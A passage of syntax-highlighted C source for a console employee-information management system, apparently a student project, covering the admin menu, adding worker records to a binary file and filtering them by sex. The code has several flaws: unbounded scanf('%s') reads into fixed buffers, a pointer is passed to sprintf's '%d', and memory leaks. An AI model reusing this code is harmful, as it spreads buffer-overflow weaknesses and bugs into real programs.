class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"账号或密码错误!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">f_3</span> <span class="token punctuation">(</span>workers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> n<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入正确的功能编号!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">see</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//该函数是从辅助文件中读取员工个数；</span><span class="token punctuation">&#123;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//data.txt为辅助的文本文件；</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp1<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"人数预存文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    NUM<span class="token operator">=</span><span class="token function">atoi</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//管理员页面，在程序中会反复调用；</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                   《职工信息管理系统》                  ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                       管理员页面！                      ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.新建职工信息                 2.浏览职工信息         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.查询职工信息                 4.删除职工信息         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   5.变更职工信息                 6.退出程序             ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">f_6</span><span class="token punctuation">(</span><span class="token keyword">char</span> n<span class="token punctuation">)</span><span class="token comment">//退出程序；</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"感谢您使用本系统，祝您工作愉快\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//以尾加法插入新的数据，并写入text.dat二进制文件中；</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token comment">//p是个指向结构体指针后面需要用到；</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//对指针p分配大小；</span>    p<span class="token operator">=</span>workers<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工号:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入姓名:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入性别:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入所担任职务:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入年龄："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>p<span class="token operator">-></span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入工资:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入家庭住址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工联系方式："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"ab+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这段程序是结束函数块的，如果没有这段代码后面内容还会继续输出。</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>workers<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//将数据存入函数中；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    NUM<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">itoa</span><span class="token punctuation">(</span>NUM<span class="token punctuation">,</span>ch<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//一个没学过的函数，把整形数转化成字符型；</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    使用外部变量NUM，在使用者使用程序时先行为，NUM赋值；    */</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//浏览已经写入的数据；</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.浏览全部信息                 2.按性别方式筛选       ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.按年龄方式筛选               4.按薪资筛选           ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入筛选的方式\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工性别编号\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.男性    \t\t     2.女性\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span><span class="token string">"男"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span><span class="token string">"女"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工薪资范围\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.青年    \t\t     2.壮年\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token 